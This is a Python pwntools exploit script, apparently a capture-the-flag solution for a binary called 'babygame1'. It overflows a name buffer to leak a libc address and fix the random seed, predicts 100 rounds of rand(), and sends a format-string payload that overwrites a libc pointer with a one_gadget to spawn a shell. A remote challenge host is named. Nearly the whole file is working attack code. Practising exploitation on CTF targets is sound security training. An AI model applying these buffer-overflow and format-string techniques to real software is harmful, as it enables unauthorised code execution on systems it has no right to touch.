#! /usr/bin/env python3
from pwn import *
from ctypes import *

arch = 64
challenge = './babygame1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.31.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = [0x14B1]
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)


p.recvuntil('Please input your name:\n')
debug()
p.send(b'a'*256+p64(0x5555555555555555)+b'a'*0x20)
libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00")) - libc.sym['__libc_start_main'] - 243 #local:237
print(hex(libc_base))
target = libc_base + 0x1ec040  #local:0x3b5040  
print(hex(target))
ogg = libc_base + 0xe3d23
ret = libc_base + 0x0000000000022679
pop_rdi = libc_base + 0x0000000000023b72
pop_rsi = libc_base + 0x000000000002604f
bin_sh = libc_base + 0x1B45BD
system = libc_base + libc.sym["system"]
c = cdll.LoadLibrary("/glibc/2.31/64/lib/libc-2.31.so")
c.srand(0x5555555555555555)
for i in range(100):
    p.recvuntil('round '+ str(i+1)+ ': \n')
    # print('round '+ str(i+1)+ ':\n')
    a = c.rand() % 3
    p.send(str((a+1)%3))
p.recvuntil("you.")
payload = b'%'+ str((ogg&0xff)).encode() + b'c' + b'%11$hhn' + b'%' + str( ((ogg>>8)&0xffff) - (ogg&0xff) ).encode() + b'c' + b'%12$hn'
payload = payload.ljust(40,b'a') + p64(target) + p64(target+1)
print(payload)
print(hex(target))
print(hex(ogg))
p.send(payload)
p.interactive()